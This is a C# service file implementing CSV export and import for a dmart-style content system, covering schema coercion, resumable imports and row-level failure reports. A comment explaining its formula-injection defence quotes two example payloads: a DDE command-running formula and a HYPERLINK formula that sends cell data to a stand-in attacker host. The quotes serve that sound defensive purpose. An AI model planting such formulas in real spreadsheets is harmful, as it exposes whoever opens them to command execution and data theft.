using System.Globalization;
using System.Text;
using System.Text.Json;
using Dmart.Api.Managed;
using Dmart.DataAdapters.Sql;
using Dmart.Models.Api;
using Dmart.Models.Core;
using Dmart.Models.Enums;
using Dmart.Models.Json;

namespace Dmart.Services;

// CSV import/export. Mirrors dmart Python's behavior:
//   * Export: run a Query, flatten record attributes (including nested payload.body),
//     compute the union of column keys, emit RFC 4180 CSV with the columns
//     ["resource_type", "shortname", "subpath", "uuid", ...flattened attributes].
//   * Import: parse a CSV file, build a Record per row using the column headers as
//     attribute keys, schema-validate each, and create via EntryService.
public sealed class CsvService(QueryService queries, EntryService entries, SchemaValidator schemaValidator)
{
    private static readonly TimeSpan RowGrace = TimeSpan.FromSeconds(5);

    public async Task<Stream> ExportAsync(Query q, string? actor, CancellationToken ct = default)
    {
        var response = await queries.ExecuteAsync(q, actor, ct);
        var records = response.Records ?? new List<Record>();
        return ExportRecords(records);
    }

    public Stream ExportRecords(IEnumerable<Record> records)
    {
        // Step 1: flatten each row.
        var flattened = records.Select(r =>
        {
            var dict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
            {
                ["resource_type"] = JsonbHelpers.EnumMember(r.ResourceType),
                ["shortname"]     = r.Shortname,
                ["subpath"]       = r.Subpath,
                ["uuid"]          = r.Uuid ?? "",
            };
            if (r.Attributes is not null)
                FlattenInto(r.Attributes, "", dict);
            return dict;
        }).ToList();

        // Step 2: compute union of all keys (preserving the canonical first-four order).
        var canonical = new[] { "resource_type", "shortname", "subpath", "uuid" };
        var extraKeys = flattened.SelectMany(d => d.Keys)
            .Where(k => !canonical.Contains(k, StringComparer.OrdinalIgnoreCase))
            .Distinct(StringComparer.OrdinalIgnoreCase)
            .OrderBy(k => k, StringComparer.OrdinalIgnoreCase)
            .ToArray();
        var allKeys = canonical.Concat(extraKeys).ToArray();

        // Step 3: emit RFC 4180 CSV.
        var sb = new StringBuilder();
        sb.Append(string.Join(",", allKeys.Select(EscapeField)));
        sb.Append("\r\n");
        foreach (var row in flattened)
        {
            sb.Append(string.Join(",", allKeys.Select(k =>
                row.TryGetValue(k, out var v) ? EscapeField(v) : "")));
            sb.Append("\r\n");
        }

        var bytes = Encoding.UTF8.GetBytes(sb.ToString());
        return new MemoryStream(bytes);
    }

    // Two ways to finish an import the request deadline cut off, both keeping
    // the row numbers of the WHOLE file so `failed[].row`, `resume_row` and the
    // operator's own file agree:
    //
    //   * `startRow` (1 = the first row after the header) skips the rows before
    //     it without touching them — the whole file is uploaded again.
    //   * `firstRow` says which file row this body's FIRST data row is, for a
    //     caller that uploads only the header plus the rows it still needs.
    //     Re-sending a 200 MB file once per part made the transfer quadratic in
    //     the number of parts.
    //
    // CsvImportInterruptedException.ResumeRow is the row to pass back to either.
    // A caller that sends the whole file leaves `firstRow` at 1; one that slices
    // sets both to the same row (the skip is then a no-op) or only `firstRow`.
    public async Task<Response> ImportAsync(
        string spaceName, string subpath, ResourceType resourceType, string? schemaShortname,
        Stream csv, string? actor, CancellationToken ct = default, bool isUpdate = false, int startRow = 1,
        int firstRow = 1)
    {
        using var reader = new StreamReader(csv, Encoding.UTF8);
        var headerLine = await reader.ReadLineAsync(ct);
        if (string.IsNullOrEmpty(headerLine))
            return Response.Fail(InternalErrorCode.MISSING_DATA, "csv has no header row", ErrorTypes.Request);

        var headers = ParseCsvLine(headerLine);

        // Schema-driven coercion for the flat scalar columns (number/integer/
        // boolean): a CSV cell is always text, but the schema may require e.g.
        // discount_value to be a JSON number, so a plain "25000" cell would
        // otherwise fail SchemaValidator's strict type check. Built once per
        // import, keyed by the schema's own property names (matching the CSV
        // header, case-insensitively).
        var propertyTypes = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        if (!string.IsNullOrEmpty(schemaShortname))
        {
            var schemaDoc = await schemaValidator.GetSchemaDocumentAsync(spaceName, schemaShortname, ct);
            // Python's import loads the schema first and 404s when it is missing.
            // Going on would write rows nothing validates (a missing schema is a
            // pass) and, in update mode, bind every entry to a schema that isn't there.
            if (schemaDoc is null)
                return Response.Fail(InternalErrorCode.OBJECT_NOT_FOUND,
                    $"schema '{schemaShortname}' not found in space '{spaceName}'", ErrorTypes.Db);
            CollectScalarPropertyTypes(schemaDoc.Value, schemaDoc.Value, propertyTypes);
        }
        // Resolve the shortname column index once — headers don't change per row.
        // The match is OrdinalIgnoreCase by design: `Shortname`, `SHORTNAME`, and
        // `shortname` are all accepted as the shortname column. Python's
        // import_resources_from_csv_handler is tolerant about header casing
        // (api/managed/utils.py:1553+ reads via pandas with no normalisation,
        // but downstream lookups rely on csv.DictReader-style key access that
        // accepts whatever the header row spelled), and the port matches the
        // more permissive form rather than the case-sensitive dictionary lookup
        // that lived here pre-#24.
        var shortnameIdx = headers.FindIndex(h =>
            string.Equals(h, "shortname", StringComparison.OrdinalIgnoreCase));
        var inserted = 0;
        var failed = new List<Dictionary<string, object>>();
        // File coordinates, not body coordinates: a sliced upload's first data
        // row is file row `firstRow`, so the counter starts one below it.
        var rowNumber = firstRow - 1;
        // The first row this call can actually process, for the report: the
        // skip below and the slice the caller sent, whichever reaches further.
        var beginRow = Math.Max(startRow, firstRow);

        // A row's write sees a cancellation only RowGrace after it happens: long
        // enough for any normal row to finish, so rows stop at a boundary below,
        // but a hung plugin hook still cannot hold the request open indefinitely.
        using var rowCts = new CancellationTokenSource();
        using var cancelRows = ct.Register(
            static s => ((CancellationTokenSource)s!).CancelAfter(RowGrace), rowCts);

        // The uploaded file is already buffered server-side, so reading it never
        // waits on the client; cancellation is checked explicitly instead.
        string? line;
        while ((line = await reader.ReadLineAsync(CancellationToken.None)) is not null)
        {
            // Rows commit one at a time, so a cancellation (REQUEST_TIMEOUT, a
            // client disconnect) is honoured here, between rows, and not inside
            // one (see rowCts). Cut mid-row, a row could be saved yet uncounted —
            // resuming would import an auto-shortname row twice — or a cancelled
            // before-hook could file it as "plugin rejected create".
            if (ct.IsCancellationRequested)
                throw new CsvImportInterruptedException(beginRow, rowNumber, inserted, failed, finished: false, ct);
            rowNumber++;
            // The rows already committed by this call are reported alongside the
            // rejection: a resumed import can cross the cap (`start_row=60000`
            // on a 120,000-row file commits 40,000 rows and then hits it), and a
            // bare failure said zero. Same `info[0]` shape the timeout answer
            // uses, which is where both the CLI and the upload dialogs read
            // progress from.
            if (rowNumber > 100_000)
                return Response.Fail(InternalErrorCode.INVALID_DATA,
                    "CSV exceeds maximum of 100,000 rows", "request",
                    Progress(inserted, failed));
            if (rowNumber < startRow) continue;
            if (string.IsNullOrWhiteSpace(line)) continue;
            var fields = ParseCsvLine(line);
            if (fields.Count != headers.Count)
            {
                failed.Add(new() { ["row"] = rowNumber, ["error"] = $"expected {headers.Count} fields, got {fields.Count}" });
                continue;
            }

            // Build attributes from the headers + values. Cell values that look like
            // a JSON array/object (start with `[` / `{`) are parsed into a JsonElement
            // so they round-trip as real arrays/objects in payload.body instead of
            // quoted strings — mirrors dmart Python's always-on heuristic in
            // import_resources_from_csv_handler (api/managed/utils.py:1553-1557).
            var rowDict = new Dictionary<string, object>();
            for (var i = 0; i < headers.Count; i++)
            {
                var declaredType = propertyTypes.TryGetValue(headers[i], out var t) ? t : null;
                // A blank cell in a declared number/integer/boolean column means
                // "no value", not the empty string. Writing "" would put a
                // string where the schema requires a number and fail the whole
                // row — which is what a sparse export→re-import did, since
                // FlattenInto writes "" for a null/absent attribute. Omitting
                // the key leaves the property genuinely absent on create, and
                // untouched by the deep merge on update.
                if (declaredType is not null && fields[i].Trim().Length == 0) continue;
                rowDict[headers[i]] = ParseCellValue(fields[i], declaredType);
            }

            // shortname column is required (or auto-generate). Read from the raw
            // fields (not rowDict) so a JSON-shaped shortname cell doesn't get lifted
            // into a JsonElement by ParseCellValue — the shortname is always a string.
            // "auto" (case-insensitive) is treated the same as an empty cell —
            // RequestHandler.IsAutoShortname is the sentinel test, shared rather than
            // re-spelled, so a CSV built by hand (or exported from a UI that offers the
            // same "auto" convention) doesn't collide every row on the literal text.
            //
            // The generated value follows RequestHandler.ResolveAutoShortname: one UUID,
            // its first 8 hex chars as the shortname, the same UUID reused as the entry's
            // Uuid. The shortname regex (^[a-zA-Zء-ي0-9٠-٩ً-ٟ_]{1,64}$)
            // has no `-`, so the value can't contain one either. Minted inside the retry
            // below, not here, so a collision gets a genuinely new name.
            var shortname = shortnameIdx >= 0 && shortnameIdx < fields.Count ? fields[shortnameIdx] : "";
            // Only the create branch can mint a name. On the update branch the
            // shortname is the row's ADDRESS: minting one there would send the
            // patch at a random name that cannot exist (OBJECT_NOT_FOUND, naming
            // a string the operator never wrote), and would make an entry
            // genuinely called "auto" unaddressable.
            var wasAuto = !isUpdate
                && (string.IsNullOrEmpty(shortname)
                    || RequestHandler.IsAutoShortname(shortname));

            // Build the entry's payload.body from the remaining columns.
            var bodyDict = rowDict
                .Where(kv => !string.Equals(kv.Key, "shortname", StringComparison.OrdinalIgnoreCase))
                .ToDictionary(kv => kv.Key, kv => kv.Value);
            var bodyJson = JsonSerializer.Serialize(bodyDict, DmartJsonContext.Default.DictionaryStringObject);
            var bodyEl = JsonDocument.Parse(bodyJson).RootElement.Clone();

            if (isUpdate)
            {
                // Deep-merge only payload.body into the existing entry.
                // EntryService.ApplyPatch reads attrs["payload"]["body"] and
                // hands it to JsonMerge.DeepMergeAndStripNulls; every other
                // field falls back to the existing row, so only the body (and
                // the payload's schema and content type, see UpdatePatchFor)
                // gets touched. Missing shortnames surface as OBJECT_NOT_FOUND
                // in the row-level failed list — symmetric with the create
                // branch's SHORTNAME_ALREADY_EXIST.
                //
                // isBulkImport: true mirrors the CreateAsync call below so a
                // 10k-row CSV update produces one HTTP-level audit log line
                // instead of 10k per-row history rows. AuditPlugin reads
                // Event.IsBulkImport to decide whether to skip.
                // On the update path the shortname is the row's ADDRESS, so there
                // is nothing to mint: a blank cell is a malformed row, not a
                // request for a new name. It used to be handed a random 8-hex
                // value and come back as OBJECT_NOT_FOUND naming a string the
                // operator never wrote, which told them nothing.
                if (string.IsNullOrEmpty(shortname))
                {
                    failed.Add(BuildFailure(rowNumber, shortname,
                        "shortname is required when is_update=true", InternalErrorCode.MISSING_DATA, null));
                    continue;
                }

                var locator = new Locator(resourceType, spaceName, subpath, shortname);
                Result<Entry> updateResult;
                try
                {
                    // The patch is built by `patchFor` once EntryService has
                    // loaded the entry it lands on — schema_shortname and
                    // content_type are re-declared only when they differ — so
                    // the `patch` argument is replaced before it is read. It
                    // used to be built here, where it read as the patch applied.
                    updateResult = await entries.UpdateAsync(locator, new(), actor, rowCts.Token,
                        isBulkImport: true,
                        patchFor: existing => UpdatePatchFor(existing, bodyEl, resourceType, schemaShortname));
                }
                catch (OperationCanceledException) when (rowCts.IsCancellationRequested)
                {
                    throw RowInterrupted(beginRow, rowNumber, shortname, inserted, failed, ct);
                }
                if (updateResult.IsOk) inserted++;
                else failed.Add(BuildFailure(rowNumber, shortname, updateResult.ErrorMessage, updateResult.ErrorCode, updateResult.Info));
                continue;
            }

            // Re-minted on every attempt, so the retry below actually gets a
            // fresh name. 8 hex is 32 bits: across a 100k-row import (the cap
            // this loop enforces) a self-collision is not a curiosity, it is
            // expected roughly once — and a caller who never chose the name
            // can't act on a SHORTNAME_ALREADY_EXIST for it. Same retry every
            // other auto-shortname path uses (RequestHandler, /user/create).
            var rowShortname = shortname;
            Result<Entry> result;
            try
            {
                result = await RequestHandler.RetryOnShortnameCollisionAsync(
                    wasAuto,
                    () =>
                    {
                        var uuid = wasAuto ? RequestHandler.NewAutoUuid() : Guid.NewGuid();
                        if (wasAuto) rowShortname = uuid.ToString("N")[..8];
                        var entry = new Entry
                        {
                            // Same UUID the shortname was derived from, matching
                            // RequestHandler.ResolveAutoShortname.
                            Uuid = uuid.ToString(),
                            Shortname = rowShortname,
                            SpaceName = spaceName,
                            Subpath = subpath,
                            ResourceType = resourceType,
                            OwnerShortname = actor ?? "anonymous",
                            IsActive = true,
                            Payload = new Payload
                            {
                                ContentType = ContentType.Json,
                                SchemaShortname = schemaShortname,
                                Body = bodyEl,
                            },
                            CreatedAt = TimeUtils.Now(),
                            UpdatedAt = TimeUtils.Now(),
                        };
                        // isBulkImport tags the Event so logging-only hooks
                        // (AuditPlugin) skip per-row noise — one HTTP-level audit
                        // line covers the whole CSV import. Functional hooks
                        // (resource_folders_creation, etc.) still fire because they
                        // ignore the flag.
                        return entries.CreateAsync(entry, actor, rawAttrs: null, isBulkImport: true, rowCts.Token);
                    },
                    r => r.ErrorCode == InternalErrorCode.SHORTNAME_ALREADY_EXIST);
            }
            catch (OperationCanceledException) when (rowCts.IsCancellationRequested)
            {
                throw RowInterrupted(beginRow, rowNumber, rowShortname, inserted, failed, ct);
            }
            if (result.IsOk) inserted++;
            else failed.Add(BuildFailure(rowNumber, rowShortname, result.ErrorMessage, result.ErrorCode, result.Info));
        }

        // Cancelled during the last row: every row is done, but the response
        // below would be written through the cancelled token and arrive empty.
        if (ct.IsCancellationRequested)
            throw new CsvImportInterruptedException(beginRow, rowNumber, inserted, failed, finished: true, ct);

        return Response.Ok(attributes: new()
        {
            ["inserted"] = inserted,
            ["failed_count"] = failed.Count,
            ["failed"] = failed,
        });
    }

    // ----- helpers -----

    // A row's write outlived RowGrace and was cancelled inside EntryService.
    // Without this it surfaced as a plain OperationCanceledException, which
    // ResourceWithPayloadHandler does not catch: the 504 then carried the
    // generic "took longer than the time limit" and no resume point at all, so
    // an operator was left with a part-imported folder and no way to continue.
    //
    // The row is also recorded in `failed`, and the resume point is set PAST it:
    // whether it was committed is genuinely unknown (the cancellation can land
    // either side of the write), and one named row to check by hand beats either
    // silently losing it or re-importing it as a duplicate.
    private static CsvImportInterruptedException RowInterrupted(
        int beginRow, int rowNumber, string shortname, int inserted,
        List<Dictionary<string, object>> failed, CancellationToken ct)
    {
        failed.Add(BuildFailure(rowNumber, shortname,
            "row was still being written when the server's time limit stopped the import; "
            + "it may or may not have been saved — check this row before resuming",
            InternalErrorCode.REQUEST_TIMEOUT, null));
        return new CsvImportInterruptedException(beginRow, rowNumber, inserted, failed, finished: false, ct);
    }

    // How many per-row failures an ERROR body carries. A 100,000-row CSV whose
    // header does not match the schema fails every row, each entry holding the
    // row, the shortname, the full validation message, the key and the value —
    // tens of megabytes of JSON, serialized and written on a request that has
    // already been declared over its time budget, and held whole by the dialog
    // before it trims the list for display. `failed_count` still reports the
    // true total and `failed_truncated` says the list is partial.
    internal const int MaxFailedInError = 1000;

    // The `info[0]` progress block an import that did not run to completion
    // reports — shared with ResourceWithPayloadHandler.CsvTimeoutInfo, so the
    // CLI and the upload dialogs read one shape whichever way the import ended.
    internal static List<Dictionary<string, object>> Progress(int inserted, List<Dictionary<string, object>> failed)
    {
        var truncated = failed.Count > MaxFailedInError;
        var block = new Dictionary<string, object>
        {
            ["inserted"] = inserted,
            ["failed_count"] = failed.Count,
            ["failed"] = truncated ? failed.GetRange(0, MaxFailedInError) : failed,
        };
        if (truncated) block["failed_truncated"] = true;
        return [block];
    }

    // The patch for one update row, built once the entry it lands on is loaded.
    // Like Python's import, which re-declares both on every row, it declares:
    //   * schema_shortname — the import's schema, so the merged body is validated
    //     against it and it is saved; only when it differs, so a permission rule
    //     on payload.schema_shortname sees no change where there is none.
    //   * content_type json — a CSV row always writes a JSON object; left on a
    //     markdown or image entry, the entry would claim one type and hold another.
    // Neither on an entry of another resource type (a row's shortname can resolve
    // to e.g. a folder in the subpath): that one keeps its own schema, as before.
    private static Dictionary<string, object> UpdatePatchFor(
        Entry existing, JsonElement body, ResourceType importedType, string? schemaShortname)
    {
        var payload = new Dictionary<string, object> { ["body"] = body };
        if (existing.ResourceType == importedType)
        {
            if (!string.IsNullOrEmpty(schemaShortname) && existing.Payload?.SchemaShortname != schemaShortname)
                payload["schema_shortname"] = schemaShortname;
            if (existing.Payload is { ContentType: not ContentType.Json })
                payload["content_type"] = "json";
        }
        return new Dictionary<string, object> { ["payload"] = payload };
    }

    // Build the per-row entry for the import's `failed` list. Beyond the base
    // (row, shortname, error, code) it enriches schema-validation failures —
    // whose Result.Info carries one structured entry per failing constraint
    // (see SchemaValidator.ToInfo) — with the first FIELD-level error's `key`
    // (dot-joined path, matching export's FlattenInto column convention) and
    // `value`. Root-level errors (e.g. `required`) carry no key and are passed
    // over in favor of the first named field. The value comes from the document
    // the validator actually rejected — for updates that's the MERGED body, so
    // an operator sees the failing value even when it isn't in their CSV.
    private static Dictionary<string, object> BuildFailure(
        int row, string shortname, string? error, int code, List<Dictionary<string, object>>? info)
    {
        var failure = new Dictionary<string, object>
        {
            ["row"] = row,
            ["shortname"] = shortname,
            ["error"] = error ?? "unknown",
            ["code"] = code,
        };
        var fieldError = info?.FirstOrDefault(e => e.ContainsKey("key"));
        if (fieldError is not null)
        {
            failure["key"] = fieldError["key"];
            if (fieldError.TryGetValue("value", out var value))
                failure["value"] = value;
        }
        return failure;
    }

    private static void FlattenInto(Dictionary<string, object> source, string prefix, Dictionary<string, string> dest)
    {
        foreach (var (k, v) in source)
        {
            var key = string.IsNullOrEmpty(prefix) ? k : $"{prefix}.{k}";
            switch (v)
            {
                case null:
                    dest[key] = "";
                    break;
                case string s:
                    dest[key] = s;
                    break;
                case bool b:
                    dest[key] = b ? "true" : "false";
                    break;
                case JsonElement el:
                    FlattenJsonElement(el, key, dest);
                    break;
                case Dictionary<string, object> nested:
                    FlattenInto(nested, key, dest);
                    break;
                case Translation t:
                    if (!string.IsNullOrEmpty(t.En)) dest[$"{key}.en"] = t.En;
                    if (!string.IsNullOrEmpty(t.Ar)) dest[$"{key}.ar"] = t.Ar;
                    if (!string.IsNullOrEmpty(t.Ku)) dest[$"{key}.ku"] = t.Ku;
                    break;
                case Payload p:
                    dest[key] = JsonSerializer.Serialize(p, DmartJsonContext.Default.Payload);
                    break;
                case List<string> stringList:
                    dest[key] = string.Join("|", stringList);
                    break;
                case string[] stringArr:
                    dest[key] = string.Join("|", stringArr);
                    break;
                case List<AclEntry> aclList:
                    dest[key] = JsonSerializer.Serialize(aclList, DmartJsonContext.Default.ListAclEntry);
                    break;
                case List<Dictionary<string, object>> dictList:
                    dest[key] = JsonSerializer.Serialize(dictList, DmartJsonContext.Default.ListDictionaryStringObject);
                    break;
                default:
                    dest[key] = ConvertScalar(v);
                    break;
            }
        }
    }

    private static void FlattenJsonElement(JsonElement el, string key, Dictionary<string, string> dest)
    {
        switch (el.ValueKind)
        {
            case JsonValueKind.Object:
                foreach (var prop in el.EnumerateObject())
                    FlattenJsonElement(prop.Value, $"{key}.{prop.Name}", dest);
                break;
            case JsonValueKind.Array:
                // Join scalar arrays with `|`; complex arrays serialize as JSON.
                var sb = new StringBuilder();
                var allScalar = true;
                var first = true;
                foreach (var item in el.EnumerateArray())
                {
                    if (item.ValueKind is JsonValueKind.Object or JsonValueKind.Array) { allScalar = false; break; }
                    if (!first) sb.Append('|');
                    sb.Append(item.ValueKind switch
                    {
                        JsonValueKind.String => item.GetString(),
                        JsonValueKind.True   => "true",
                        JsonValueKind.False  => "false",
                        JsonValueKind.Null   => "",
                        _                    => item.GetRawText(),
                    });
                    first = false;
                }
                dest[key] = allScalar ? sb.ToString() : el.GetRawText();
                break;
            case JsonValueKind.String:
                dest[key] = el.GetString() ?? "";
                break;
            case JsonValueKind.True:
                dest[key] = "true"; break;
            case JsonValueKind.False:
                dest[key] = "false"; break;
            case JsonValueKind.Null:
                dest[key] = ""; break;
            default:
                dest[key] = el.GetRawText(); break;
        }
    }

    private static string ConvertScalar(object? v) => v switch
    {
        null      => "",
        string s  => s,
        bool b    => b ? "true" : "false",
        IFormattable f => f.ToString(null, CultureInfo.InvariantCulture),
        _         => v.ToString() ?? "",
    };

    // CSV formula injection (a.k.a. DDE injection): Excel, LibreOffice and Google
    // Sheets evaluate a cell as a formula when its text starts with `=`, `+`, `-`,
    // `@`, TAB or CR — and they do so *after* stripping the RFC 4180 quotes, so
    // quoting is not a defense. Every cell here is attacker-supplied content (a
    // low-privilege user setting displayname.en to `=cmd|'/c calc.exe'!A0` or
    // `=HYPERLINK("https://evil.tld/?d="&A1&A2,"Open")`) that an admin later opens
    // from /managed/csv. Prefixing a single quote is the spreadsheet-universal
    // "treat the rest as literal text" marker, so neutralize first and then apply
    // the normal quoting rules. Deliberately export-side only: ImportAsync does not
    // strip the prefix, so an export→re-import cycle keeps the leading apostrophe
    // on an affected cell — a visible artifact is preferable to a live formula.
    //
    // Plain numbers are exempt. EscapeField runs over EVERY cell, and a leading
    // `-` is far more often a negative number than an injection attempt: without
    // the exemption `-5` exports as `'-5`, which spreadsheets import as text, so
    // whole numeric columns silently stop summing. A value that parses as a
    // number can't carry a formula payload anyway — the parse is the proof.
    private static string EscapeField(string s)
    {
        if (s.Length > 0 && s[0] is '=' or '+' or '-' or '@' or '\t' or '\r'
            && !double.TryParse(s, NumberStyles.Float, CultureInfo.InvariantCulture, out _))
            s = $"'{s}";
        if (s.Contains(',') || s.Contains('"') || s.Contains('\n') || s.Contains('\r'))
            return $"\"{s.Replace("\"", "\"\"")}\"";
        return s;
    }

    // Mirrors the always-on heuristic in dmart Python's import_resources_from_csv_handler
    // (api/managed/utils.py:1553-1557): if the stripped cell starts with `[` or `{`,
    // try to parse it as JSON; on failure, fall back to the raw string. When the
    // schema declares the column number/integer/boolean, also try parsing the whole
    // cell as JSON of that kind — mirrors Python's data_types_mapper coercion, scoped
    // to the scalar types a CSV cell can unambiguously represent.
    private static object ParseCellValue(string raw, string? declaredType)
    {
        if (string.IsNullOrEmpty(raw)) return raw;
        var stripped = raw.Trim();
        if (stripped.Length == 0) return raw;

        // Booleans first: JSON only spells them `true`/`false`, but a CSV is
        // written by a spreadsheet, and Excel and LibreOffice both emit
        // `TRUE`/`FALSE`. `1`/`0` and `yes`/`no` are the other two spellings a
        // hand-built sheet uses. Without these the declared-boolean column
        // still stored a string and still failed validation — i.e. the common
        // case, while only the JSON-literal spelling worked.
        if (declaredType is "boolean")
            return ParseBooleanCell(stripped) is { } b ? (object)(b ? TrueElement : FalseElement) : raw;

        var first = stripped[0];
        var looksLikeJson = first is '[' or '{';
        var looksLikeNumber = declaredType is "number" or "integer";
        if (!looksLikeJson && !looksLikeNumber) return raw;
        try
        {
            using var doc = JsonDocument.Parse(stripped);
            var kind = doc.RootElement.ValueKind;
            if (looksLikeJson && kind is JsonValueKind.Array or JsonValueKind.Object)
                return doc.RootElement.Clone();
            if (looksLikeNumber && kind is JsonValueKind.Number)
                return doc.RootElement.Clone();
        }
        catch (JsonException)
        {
            // fall through to raw
        }
        return raw;
    }

    // Pre-parsed JSON `true` / `false`, so a boolean cell doesn't allocate a
    // JsonDocument per row just to produce one of two constant elements.
    private static readonly JsonElement TrueElement = JsonDocument.Parse("true").RootElement.Clone();
    private static readonly JsonElement FalseElement = JsonDocument.Parse("false").RootElement.Clone();

    // The spellings a spreadsheet writes for a boolean. Null when the cell is
    // none of them, which leaves it a string for the schema to reject — an
    // unrecognized value must not silently become `false`.
    private static bool? ParseBooleanCell(string stripped) => stripped switch
    {
        _ when stripped.Equals("true", StringComparison.OrdinalIgnoreCase)  => true,
        _ when stripped.Equals("false", StringComparison.OrdinalIgnoreCase) => false,
        _ when stripped.Equals("yes", StringComparison.OrdinalIgnoreCase)   => true,
        _ when stripped.Equals("no", StringComparison.OrdinalIgnoreCase)    => false,
        "1" => true,
        "0" => false,
        _   => null,
    };

    // Collects the schema's declared property names whose type is
    // number/integer/boolean — the only types a CSV cell's text needs help
    // coercing into. string/object/array columns need no help: strings
    // round-trip as-is, and object/array cells are already JSON blobs handled by
    // ParseCellValue's `[`/`{` heuristic.
    //
    // Names are matched against CSV headers VERBATIM, because import keeps
    // headers flat (Python's csv.DictReader does, and the failed-row `key` the
    // API reports is the header text — see the "price: usd" case). So a schema
    // declaring a literal dotted property name like {"stats.views": {...}} is
    // matched; walking INTO a nested {"stats": {"properties": {"views": ...}}}
    // is deliberately not done, because import never un-flattens "stats.views"
    // into a nested object, so the nested constraint can never apply to it and
    // the synthesized dotted path would only describe a property the schema
    // does not actually declare.
    //
    // Composition keywords ARE followed: a schema assembled from allOf/anyOf/
    // oneOf members, or from a local $ref into $defs/definitions, declares its
    // properties just as directly as an inline one, and skipping those silently
    // dropped coercion for the whole document.
    private static void CollectScalarPropertyTypes(
        JsonElement schema, JsonElement root, Dictionary<string, string> types, HashSet<string>? seenRefs = null)
    {
        // A sub-schema is legally `true`/`false` (draft 6+), and a stored
        // document can be any JSON at all. JsonElement.TryGetProperty throws
        // InvalidOperationException — not JsonException — on a non-object, so
        // this guard is what keeps a boolean schema from 500-ing the import.
        if (schema.ValueKind != JsonValueKind.Object) return;

        if (schema.TryGetProperty("properties", out var props) && props.ValueKind == JsonValueKind.Object)
        {
            foreach (var prop in props.EnumerateObject())
            {
                if (ReadDeclaredScalarType(prop.Value) is { } type) types[prop.Name] = type;
            }
        }

        foreach (var keyword in new[] { "allOf", "anyOf", "oneOf" })
        {
            if (!schema.TryGetProperty(keyword, out var members) || members.ValueKind != JsonValueKind.Array)
                continue;
            foreach (var member in members.EnumerateArray())
                CollectScalarPropertyTypes(member, root, types, seenRefs);
        }

        // Local pointers only ("#/$defs/x"). Remote refs never resolved here —
        // SchemaValidator doesn't configure a registry either, so they don't
        // work anywhere in dmart. The seen-set stops a self-referential schema
        // from recursing forever.
        if (schema.TryGetProperty("$ref", out var refEl) && refEl.ValueKind == JsonValueKind.String
            && refEl.GetString() is { } pointer && pointer.StartsWith("#/", StringComparison.Ordinal))
        {
            seenRefs ??= new HashSet<string>(StringComparer.Ordinal);
            if (seenRefs.Add(pointer) && ResolveLocalPointer(root, pointer) is { } target)
                CollectScalarPropertyTypes(target, root, types, seenRefs);
        }
    }

    // The declared type of one property sub-schema, or null when it isn't one of
    // the three a CSV cell needs coercing into. `type` may be a union array, in
    // which case the first coercible member wins.
    private static string? ReadDeclaredScalarType(JsonElement propertySchema)
    {
        if (propertySchema.ValueKind != JsonValueKind.Object) return null;   // `true`/`false` sub-schema
        if (!propertySchema.TryGetProperty("type", out var typeEl)) return null;
        var type = typeEl.ValueKind switch
        {
            JsonValueKind.String => typeEl.GetString(),
            // GetString() throws on a non-string member, so filter by kind first.
            JsonValueKind.Array => typeEl.EnumerateArray()
                .Where(t => t.ValueKind == JsonValueKind.String)
                .Select(t => t.GetString())
                .FirstOrDefault(t => t is "number" or "integer" or "boolean"),
            _ => null,
        };
        return type is "number" or "integer" or "boolean" ? type : null;
    }

    // Minimal RFC 6901 walk for the "#/a/b" form, with ~1/~0 unescaping.
    private static JsonElement? ResolveLocalPointer(JsonElement root, string pointer)
    {
        var current = root;
        foreach (var rawSegment in pointer[2..].Split('/', StringSplitOptions.RemoveEmptyEntries))
        {
            var segment = rawSegment.Replace("~1", "/", StringComparison.Ordinal)
                                    .Replace("~0", "~", StringComparison.Ordinal);
            if (current.ValueKind != JsonValueKind.Object
                || !current.TryGetProperty(segment, out var next))
                return null;
            current = next;
        }
        return current;
    }

    // RFC 4180 CSV line parser — handles quoted fields with embedded commas, newlines,
    // and escaped quotes (`""`). Note: doesn't support records that span lines; use
    // a streaming reader if your CSV has multi-line quoted fields.
    private static List<string> ParseCsvLine(string line)
    {
        var fields = new List<string>();
        var sb = new StringBuilder();
        var inQuotes = false;
        for (var i = 0; i < line.Length; i++)
        {
            var ch = line[i];
            if (inQuotes)
            {
                if (ch == '"')
                {
                    if (i + 1 < line.Length && line[i + 1] == '"') { sb.Append('"'); i++; }
                    else inQuotes = false;
                }
                else sb.Append(ch);
            }
            else
            {
                if (ch == ',') { fields.Add(sb.ToString()); sb.Clear(); }
                else if (ch == '"') inQuotes = true;
                else sb.Append(ch);
            }
        }
        fields.Add(sb.ToString());
        return fields;
    }
}

// Thrown when ImportAsync is cancelled part-way — the request deadline or a
// client disconnect. Rows commit one at a time, so everything before the cut is
// already saved; this carries how far the import got, so a caller can report a
// partial import as exactly that instead of an unexplained failure.
public sealed class CsvImportInterruptedException : OperationCanceledException
{
    public CsvImportInterruptedException(
        int firstRow, int lastRow, int inserted, List<Dictionary<string, object>> failed, bool finished,
        CancellationToken token)
        : base($"CSV import cancelled after row {lastRow}", token)
    {
        FirstRow = firstRow;
        LastRow = lastRow;
        Inserted = inserted;
        Failed = failed;
        Finished = finished;
        KnowsProgress = true;
    }

    // The three standard exception constructors (CA1032). ImportAsync always
    // knows how far it got; these are for the ordinary construction paths
    // (wrapping, rethrowing) and report that they do NOT know — see
    // KnowsProgress. They must not report row 1: a wrapped-and-rethrown
    // interruption would then tell an operator whose import had already written
    // most of the file to start it again from the top, duplicating every
    // auto-shortname row.
    public CsvImportInterruptedException()
        : base("CSV import cancelled") { }

    public CsvImportInterruptedException(string message)
        : base(message) { }

    public CsvImportInterruptedException(string message, Exception innerException)
        : base(message, innerException) { }

    // The row this import started at, and the last row it got through. Rows are
    // numbered from the first row after the header; each row from FirstRow to
    // LastRow is saved, is in Failed, or was blank.
    public int FirstRow { get; } = 1;
    public int LastRow { get; }
    public int Inserted { get; }
    public List<Dictionary<string, object>> Failed { get; } = [];

    // True when the cancellation landed after the last row: nothing is left to
    // import, only the answer was cut off.
    public bool Finished { get; }

    // False on the standard constructors above, whose Inserted/LastRow are
    // defaults rather than measurements. A caller reporting progress must say
    // "unknown" rather than quote them — ResumeRow in particular.
    public bool KnowsProgress { get; }

    // The first row not processed — the start_row that imports the rest. Only
    // meaningful when KnowsProgress.
    public int ResumeRow => Math.Max(LastRow + 1, FirstRow);
}
